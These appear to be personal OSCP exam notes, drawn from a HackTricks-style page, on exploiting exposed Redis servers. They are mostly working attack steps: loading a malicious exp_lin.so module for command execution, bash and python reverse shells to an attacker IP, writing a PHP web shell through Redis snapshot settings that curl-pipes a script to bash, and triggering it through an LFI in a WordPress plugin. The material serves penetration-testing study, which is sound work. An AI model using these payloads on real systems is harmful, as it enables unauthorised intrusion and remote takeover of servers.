https://blog.1nf1n1ty.team/hacktricks/network-services-pentesting/6379-pentesting-redis

Redis-cli
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `redis-cli -h ${ip} -p 6379`;

dv.paragraph("```bash\n" + command + "\n```");
```
```
AUTH [password]
```

```
INFO
```

```
KEYS *
```

---

SELECT <db_number>

KEYS (*)

1) key1
2) key2
3) key3

get key2
	it will "cat" the value of key2 out in shell
	
---

### 

Redis Authentication

**By default** Redis can be accessed **without credentials**. However, it can be **configured** to support **only password, or username + password**. It is possible to **set a password** in _**redis.conf**_ file with the parameter `requirepass` **or temporary** until the service restarts connecting to it and running: `config set requirepass p@ss$12E45`. Also, a **username** can be configured in the parameter `masteruser` inside the _**redis.conf**_ file.

```
sudo nano /etc/redis/redis.conf
```

---


To complete the RCE attack, there are 2 condition that need to be fulfilled.

- Allow you to upload the module
- Redis-cli without authentication required

https://github.com/n0b0dyCN/RedisModules-ExecuteCommand

Grab precompiled exp.so
```
wget https://github.com/jas502n/Redis-RCE/blob/master/exp_lin.so
```

Enter FTP
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `ftp ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
Find writeable Directory, upload exp_lin.so
```
put exp_lin.so
```

Open Redis-CLI
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `redis-cli -h ${ip} -p 6379`;

dv.paragraph("```bash\n" + command + "\n```");
```
Load module
```
LOAD /var/ftp/[directoryname]/exp_lin.so
```

You should see "ok"

Run command
```
system.exec "id"
```

Success.

Reverse Shell connection

On KALI ATTACKER
```
cd ~/Desktop/Tools && python3 penelope.py -p 80 -O / --oscp-safe
```

On VICTIM HOST Redis CLI
```
system.exec "bash -i >& /dev/tcp/192.168.45.232/80 0>&1"
```


---

https://github.com/jas502n/Redis-RCE

can automatically get an interactive shell or a reverse shell in Redis(<=5.0.5).

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";;const ip = page?.IP ?? "NO IP FOUND";

const command = `python redis-rce.py -r ${ip} -p 6379 -L ${KaliIP} -f exp_lin.so`;

dv.paragraph("```bash\n" + command + "\n```");
```
Need password

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";;const ip = page?.IP ?? "NO IP FOUND";

const command = `python redis-rce.py -a [password] -r ${ip} -p 6379 -L ${KaliIP} -f exp_lin.so`;

dv.paragraph("```bash\n" + command + "\n```");
```

---

### Phase 1: Popping the Web Shell via Redis

Commands are sent directly to the exposed Redis service to flush the data memory into a specific file path:

**Configure Directory:** Sets the working directory where Redis saves its database snapshots
```
config set dir /opt/redis-files
```
 **Configure Filename:** _Changes the snapshot database filename to a executable PHP extension._
```
config set dbfilename exe.php
```

**Inject Code:** Stores the payload string inside a key memory space
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `set test '<?php system("curl http://${KaliIP}/shell.sh | bash"); ?>'`;

dv.paragraph("```bash\n" + command + "\n```");
```
**Write to Disk:** _Forces Redis to write the current dataset (including the PHP payload) to the specified file._
```
save
```

### Phase 2: Staging the Reverse Shell Payload On KALI ATTACKER

gedit shell.sh (port 9002)
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `#!/bin/bash  
  
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${KaliIP}",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`;

dv.paragraph("```bash\n" + command + "\n```");
```

```
python3 -m http.server 80
```

### Phase 3: Triggering Execution via LFI

The attacker targets the parameter `ajax_path` inside the vulnerable WordPress plugin component. By pointing the path to the Redis output location (`/opt/redis-files/exe.php`), the web server interprets the snapshot file as valid PHP code, executing the internal payload and triggering the reverse connection.

```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `http://${ip}/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/opt/redis-files/exe.php`;

dv.paragraph("```bash\n" + command + "\n```");
```
